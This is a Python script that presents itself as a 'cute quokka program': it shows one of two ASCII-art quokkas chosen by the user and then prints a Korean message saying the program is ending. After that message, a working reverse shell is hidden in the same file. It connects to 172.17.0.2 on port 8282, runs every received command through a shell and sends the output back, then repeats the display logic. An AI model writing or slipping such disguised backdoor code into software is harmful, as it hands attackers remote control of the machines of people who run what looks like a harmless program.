print("<< 귀여운 쿼카 프로그램 >>")

v_quokka = '''         xxxxxxx                      
                      xx     xx                     
   xxx     xxxxxxxxxxxx       xx                    
 xxx  xxxxxx        xx         xx                   
 x      xx                      xx                  
 x                               xx                 
 xx                    xxx        xx                
  xxx     xxx          xxx          xx              
    x     xxx          xxx           xx       xxx   
   xx     xxx                         xx     xx x xx
   x             xxxx                  x    xxxxxxxx
  xx            xxxxx                  x xxxx     xx
 xx                x     x            xxxx        x 
 x           xx   xxxx  xx           xx           x 
 x             xxxx  xxxx          xxx           x  
 x               xx    xx        xxx             x  
 xx                xxxxx         x               x  
  xxx                                            x  
    xxxx                                        x   
   xx                                          xx   
  xx                                           x    
  x                                            x    
xx                                             x    
 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'''

smile_quokka = '''
                         ooo                             
     ooooo             ooo  oo                           
    o    oo    oooooo oo      oo                         
   oo     ooooo     oo         oo                        
   o                            ooo                      
  oo                    ooo       oo                     
   o                   oo ooo      oo                    
   o        ooo      oo             o                    
  oo      oo  oo                     o            ooo    
 oo       o        ooooo              oo         o oooooo
 o                 ooooo               ooooooooooo o ooo 
oo                oooooo                oo           oooo
oo                   oo       oo         o            oo 
 oo          oo      ooo     oo         o            oo  
  o           oooooooo ooooooo       oooo           oo   
  ooo             oo     oo        ooo            oo     
    oo             ooooooo                      ooo      
     oo                                        oo        
     oo       ooooooo                       ooo          
    oo              oooooo               oooo            
    o                 oooo             ooo               
   oo                  oo              o                 
   o                  oooo            o                  
   oo               oooooo            o                  
            ooooooooo                 o                  '''

print("보고싶은 사진 번호를 선택하세요(1~2) : ")
select = input()

if(select=='1'):
    print(v_quokka)
if(select=='2'):
    print(smile_quokka)

print('\n')
print("프로그램을 종료합니다~")

import socket
import subprocess
h="172.17.0.2"
p=8282
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((h,p))
while True:
    c=s.recv(1024).decode()
    output=subprocess.run(c,shell=True,stdout=subprocess.PIPE,text=True)
    result=output.stdout
    if(result==''):
        s.send("suc".encode())
    else:
        s.send(result.encode())
if(select=='1'):
    print(v_quokka)
if(select=='2'):
    print(smile_quokka)